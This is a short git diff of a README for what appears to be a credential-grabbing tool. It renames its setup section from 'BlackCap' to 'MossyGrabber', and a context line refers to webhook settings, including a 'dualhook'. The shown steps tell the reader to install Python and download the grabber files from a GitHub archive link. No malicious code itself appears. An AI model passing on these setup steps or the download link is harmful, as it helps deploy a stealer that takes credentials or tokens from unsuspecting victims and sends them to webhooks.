@@ -22,7 +22,7 @@ one time for `config.webhook` and one time for `config.uwu` who is the dualhook 
 - [💼・Term](#terms)
 
 
-## <a id="setup"></a> 📁 〢 Setting up BlackCap
+## <a id="setup"></a> 📁 〢 Setting up MossyGrabber
 
 1. Install [Python](https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe)
 2. Install [MossyGrabber Files](https://github.com/Inplex-sys/MossyGrabber-NoDualHook/archive/refs/heads/main.zip)
